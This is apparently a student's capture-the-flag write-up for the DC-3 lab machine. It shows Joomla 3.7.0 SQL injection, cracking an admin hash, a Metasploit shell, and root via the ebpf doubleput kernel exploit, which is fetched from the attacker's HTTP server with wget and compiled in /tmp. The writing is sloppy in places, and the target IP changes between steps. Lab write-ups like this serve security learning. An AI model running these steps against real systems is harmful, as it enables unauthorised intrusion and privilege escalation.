

The first step was to scan all ports on the target machine.

```bash
nmap -p- -sC -sV -T5 192.168.56.108 --open
```


- `-p-` scans all 65,535 TCP ports.
    
- `-sC` runs Nmap's default scripts.
    
- `-sV` attempts to identify service and version information.
    
- `-T5` increases the scan speed.
    
- `--open` displays only open ports.
    

The scan showed that only **port 80** was open, indicating that the target was hosting a web server.

The web application was identified as a **Joomla CMS** website.

---

## 2.2 Manual Web Enumeration

The target website was accessed through a web browser to perform basic manual enumeration.

The following areas were checked:

- Login pages
    
- Page source code
    
- Possible SQL injection points
    
- `robots.txt`
    

However, these initial manual checks did not reveal anything useful. Therefore, further automated enumeration was performed.

---

# 3. Joomla Enumeration



The Joomla website was scanned using JoomScan.

```bash
joomscan --url http://192.168.56.108 -ec
```

The scan identified the Joomla version as:

```text
Joomla 3.7.0
```

---

# 4. Searching for Known Vulnerabilities

After identifying the Joomla version, SearchSploit was used to search the local Exploit-DB database.

```bash
searchsploit joomla 3.7.0
```

The search returned the following relevant vulnerability:

```text
Joomla! 3.7.0 - 'com_fields' SQL Injection
```

We can see this is vulnerable to SQL Injection in com_fields.

---

# 5. Exploiting the Joomla SQL Injection Vulnerability

 When i try to use a exploit in metasploit, it didnt work Because it asked for admin privileged user. lets now to to google and search for one.

We found a vulnerabilitiy script from a github for this,vulnerbility.
`https://github.com/teranpeterson/Joomblah/blob/master/joomblah.py`


The script was executed using:

```bash
python joomblah.py 192.168.56.104
```
Now since we have a hash, we can  crack this hash. But before that we need to find the hashing format of this. this is a bcrypt hash. To identify the type and also crack it, we can use the site, ==hashes.com==
So when we crack the hash we got the password as `snoopy`. So now we can try to log in. 
Now lets spinup the msfconsole again and try to exploit since we have the admin acc. Now a ,meterpreter session opened. 

`shell`
Ok now lets upgrade this to a python tty shell
````
python -c 'import pty; pty.spawn("/bin/bash")'
````

We can upgrade this further to use tab autocomplete and wont cancel if press ctrl C and etc. 
 
So now we need to examine the files. we are in `var/www/html/templates/beez3` . and lets go back step by step and find for something interesting.When we go to `/var/www/html`. there is an interesting file called configuration.php. when we examine it there are info like user names and passwords of the sqli database admin. Also the database is offline. 

So lets try something else. when we check the kernal version of the machine `uname -r` we get `4.4.0-21-generic`. Lets search for a exploit.  We found a good exploit. lets now copy the name and go to exploit db and get the url to download the exploit and download it

```text
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

The exploit was intended to exploit a vulnerability in the Linux kernel and potentially elevate privileges from a normal user to root.

---

# 12. Transferring the Exploit to the Target

A Python HTTP server was started on the attacking machine.

```bash
python -m http.server 8000
```

The exploit was then downloaded onto the victim machine using.The user did not have sufficient permissions to write directly into protected directories such as `/home` or other system locations.So i used ==tmp== because `/tmp` directory is commonly writable by users and is therefore useful as a temporary location for transferring and extracting files.

```bash
wget 192.168.56.102:8000/Downloads/39772.zip
```


The downloaded ZIP archive was extracted using:

```bash
unzip 39772.zip
```

After extraction, the directory was examined:

```bash
cd 39772
ls -la
```

- `ls -la` displays all files, including hidden files
The directory contained the following files:

```text
.DS_Store
crasher.tar
exploit.tar
```

The `exploit.tar` archive contained the actual exploit files.

The TAR archive was extracted using:

```bash
tar -xvf exploit.tar
```

- `-x` extracts files from the archive.
    
- `-v` displays the extracted files.
    
- `-f` specifies the archive filename.
    

After extraction, the following directory was obtained:

```text
ebpf_mapfd_doubleput_exploit
```

The directory was accessed using:

```bash
cd ebpf_mapfd_doubleput_exploit
ls
```

The following files were found:

```text
compile.sh
doubleput.c
hello.c
suidhelper.c
```

Then we give execute permission to these files and execute and we get the root

 `chmod +x compile.sh`.  then again same for for the doubleput.c file. 
 Then run the file
 `./compile.sh
  `./doubleput`. Now we have root.
  
  ============================================================

==NOTE==
  
 `doubleput.c` is a **C source code file**, not a directly executable program.

A `.c` file contains C programming language instructions. The operating system cannot execute C source code directly as a normal program.

When attempting to run the `.c` file directly, the system attempted to interpret the contents incorrectly, resulting in errors involving C syntax 
```text
doubleput
```

is the **compiled executable program** created from that source code.

The `compile.sh` script compiled the required C files and produced the executable. Therefore, `./doubleput` could be executed by the Linux operating system.

In short:

```text
doubleput.c → C source code → Cannot be directly executed
```

```text
compile.sh → Compiles the source code
```

```text
doubleput → Compiled executable → Can be executed
```
============================================================
# 18. Root Access

 
```
root@DC-3:/tmp# cd /root  
cd /root  
root@DC-3:/root# ls  
ls  
the-flag.txt  
root@DC-3:/root# cat the-flag.txt  
cat the-flag.txt  
__        __   _ _   ____                   _ _ _ _  
\ \      / /__| | | |  _ \  ___  _ __   ___| | | | |  
 \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |  
  \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|  
   \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)  
  
  
Congratulations are in order.  :-)  
  
I hope you've enjoyed this challenge as I enjoyed making it.  
  
If there are any ways that I can improve these little challenges,  
please let me know.  
  
As per usual, comments and complaints can be sent via Twitter to @DCAU7  
  
Have a great day!!!!  
root@DC-3:/root#
```

